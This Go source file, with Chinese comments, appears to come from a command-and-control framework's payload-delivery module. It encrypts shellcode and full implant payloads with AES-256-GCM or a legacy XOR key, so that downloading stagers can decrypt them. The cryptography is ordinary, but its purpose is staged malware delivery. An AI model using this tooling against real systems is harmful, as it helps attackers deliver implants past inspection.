package delivery

// 投递载荷加密（crypto_mode=aead）。
//
// 设计取舍：
//   - 用 AES-256-GCM（stdlib），不引入 x/crypto 依赖，Stager 生成时无需联网拉模块；
//   - 每次下发随机 12 字节 nonce，拼在密文前（nonce || ciphertext+tag）；
//   - 密钥是 per-delivery 的 base64url 32 字节，由服务端生成并随 Stager 模板注入；
//   - 加密完整载荷（full）与 shellcode/woff。Windows Stager 拉 shellcode、Linux
//     Stager 拉 full，两者都内置密钥解密；Stager 自身必须保持可执行，不加密。
//   - shellcode/woff 在 AEAD 模式下不再适合外部 loader 直接使用，命令矩阵会隐藏
//     相关直链命令。

import (
	"BackendTemplate/pkg/database"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"strings"
)

// AEADKeySize AES-256 密钥长度
const AEADKeySize = 32

// NewAEADKey 生成 base64url（无填充）32 字节密钥。
func NewAEADKey() (string, error) {
	key := make([]byte, AEADKeySize)
	if _, err := rand.Read(key); err != nil {
		return "", fmt.Errorf("生成载荷密钥失败: %w", err)
	}
	return base64.RawURLEncoding.EncodeToString(key), nil
}

// DecodeAEADKey 解析 base64url / base64（有无填充均可）密钥。
func DecodeAEADKey(s string) ([]byte, error) {
	s = strings.TrimSpace(s)
	if s == "" {
		return nil, fmt.Errorf("载荷密钥为空")
	}
	for _, enc := range []*base64.Encoding{
		base64.RawURLEncoding, base64.URLEncoding,
		base64.RawStdEncoding, base64.StdEncoding,
	} {
		if b, err := enc.DecodeString(s); err == nil && len(b) == AEADKeySize {
			return b, nil
		}
	}
	return nil, fmt.Errorf("载荷密钥格式无效（需要 base64 编码的 %d 字节）", AEADKeySize)
}

// AEADKeyBytes 解析密钥，失败返回 nil（调用方按未启用处理）。
func AEADKeyBytes(s string) []byte {
	b, err := DecodeAEADKey(s)
	if err != nil {
		return nil
	}
	return b
}

// AEADEncrypt 加密并返回 nonce||ciphertext||tag。
func AEADEncrypt(data []byte, keyB64 string) ([]byte, error) {
	key, err := DecodeAEADKey(keyB64)
	if err != nil {
		return nil, err
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return nil, err
	}
	out := gcm.Seal(nil, nonce, data, nil)
	return append(nonce, out...), nil
}

// AEADDecrypt 解密 nonce||ciphertext||tag（服务端测试/工具用）。
func AEADDecrypt(payload []byte, keyB64 string) ([]byte, error) {
	key, err := DecodeAEADKey(keyB64)
	if err != nil {
		return nil, err
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	if len(payload) < gcm.NonceSize() {
		return nil, fmt.Errorf("密文过短")
	}
	return gcm.Open(nil, payload[:gcm.NonceSize()], payload[gcm.NonceSize():], nil)
}

// EnsureCryptoDefaults 规范化并补齐加密配置。
//   - 空 crypto_mode + XorKey != 0 → 旧记录自动视为 xor；
//   - xor 模式下 XorKey 为 0 时随机生成非零单字节；
//   - aead 模式下缺少/非法密钥时生成新密钥。
func EnsureCryptoDefaults(meta *database.WebDelivery) {
	mode := strings.ToLower(strings.TrimSpace(meta.CryptoMode))
	if mode == "" {
		if meta.XorKey != 0 {
			mode = "xor"
		} else {
			mode = "none"
		}
	}
	switch mode {
	case "aead":
		if _, err := DecodeAEADKey(meta.DeliveryKey); err != nil {
			if key, err2 := NewAEADKey(); err2 == nil {
				meta.DeliveryKey = key
			}
		}
	case "xor":
		if meta.XorKey == 0 {
			b := make([]byte, 1)
			if _, err := rand.Read(b); err == nil && b[0] == 0 {
				b[0] = 0xA5
			}
			if b[0] == 0 {
				b[0] = 0xA5
			}
			meta.XorKey = int(b[0])
		}
	default:
		mode = "none"
	}
	meta.CryptoMode = mode
}
